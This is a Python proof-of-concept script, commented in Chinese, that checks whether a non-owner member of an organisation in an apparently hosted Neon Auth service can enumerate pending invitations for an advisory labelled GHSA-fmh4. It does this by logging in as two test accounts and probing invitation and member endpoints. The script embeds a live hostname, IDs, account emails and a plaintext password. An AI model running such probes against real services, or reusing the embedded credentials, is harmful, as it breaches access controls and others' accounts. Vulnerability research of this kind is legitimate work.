# -*- coding: utf-8 -*-
"""GHSA-fmh4 泄露面:org 成员(非 owner)能否看到 pending 邀请/邀请 ID
na2(owner) 再 invite 第三方邮箱 -> secn12(member) 视角枚举 org invitations"""
import http.client, ssl, json, time

ctx = ssl.create_default_context()
NA = 'ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build'
ORIGIN = 'http://localhost:3000'
ORG_ID = '5cab4435-9577-44cb-8cf0-50fa9a84ebd7'
NA2_MAIL = 'libobo1229+na2@gmail.com'
N12_MAIL = 'libobo1229+secn12@gmail.com'
PW = 'SecTest!2026pass2'

def login(email):
    conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
         'Content-Type': 'application/json', 'Origin': ORIGIN}
    conn.request('POST', '/neondb/auth/sign-in/email',
                 json.dumps({'email': email, 'password': PW}).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    st = r.status
    hdrs = dict((k.lower(), v) for k, v in r.getheaders())
    conn.close()
    ck = ''
    for part in hdrs.get('set-cookie', '').split(','):
        kv = part.strip().split(';')[0]
        if '=' in kv:
            k, v = kv.split('=', 1)
            ck = ck + ('; ' if ck else '') + '%s=%s' % (k.strip(), v.strip())
    return st, ck

def req(cookie, method, path, body=None):
    try:
        conn = http.client.HTTPSConnection(NA, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json',
             'Content-Type': 'application/json', 'Origin': ORIGIN, 'Cookie': cookie}
        conn.request(method, '/neondb/auth' + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

print('=== [1] na2(owner) 再 invite 第三方邮箱 ===', flush=True)
st, ck2 = login(NA2_MAIL)
print('na2 login:', st, flush=True)
st, raw = req(ck2, 'POST', '/organization/invite-member',
              {'email': 'libobo1229+secn13@gmail.com', 'role': 'member', 'organizationId': ORG_ID})
print('invite secn13:', st, raw[:250].replace('\n', ' '), flush=True)

print('\n=== [2] secn12(member 角色) 视角枚举 ===', flush=True)
st, ck12 = login(N12_MAIL)
print('secn12 login:', st, flush=True)
probes = [
    ('GET', '/organization/invitations', None),
    ('POST', '/organization/invitations', {}),
    ('GET', '/organization/members', None),
    ('POST', '/organization/members', {'organizationId': ORG_ID}),
    ('GET', '/organization/member', None),
    ('POST', '/organization/member', {'organizationId': ORG_ID}),
    ('GET', '/organization/invites', None),
    ('POST', '/organization/invites', {'organizationId': ORG_ID}),
    ('GET', '/organization/%s' % ORG_ID, None),
    ('POST', '/organization/%s' % ORG_ID, {}),
    ('GET', '/organization/invitation/45abf8f5-86f7-4f66-a700-b45f2236e649', None),
    ('GET', '/organization/members/%s' % ORG_ID, None),
    ('POST', '/organization/members/%s' % ORG_ID, {}),
]
for m, p, b in probes:
    st2, raw2 = req(ck12, m, p, b)
    print('[%s %s] -> %d %s' % (m, p[:60], st2, raw2[:250].replace('\n', ' ')), flush=True)
    time.sleep(0.2)

print('\n=== [3] owner 视角 pending invites 可见性 ===', flush=True)
st3, raw3 = req(ck2, 'GET', '/organization/invitations')
print('[owner GET invitations] -> %d %s' % (st3, raw3[:300].replace('\n', ' ')), flush=True)
st4, raw4 = req(ck2, 'POST', '/organization/invitations', {})
print('[owner POST invitations] -> %d %s' % (st4, raw4[:300].replace('\n', ' ')), flush=True)
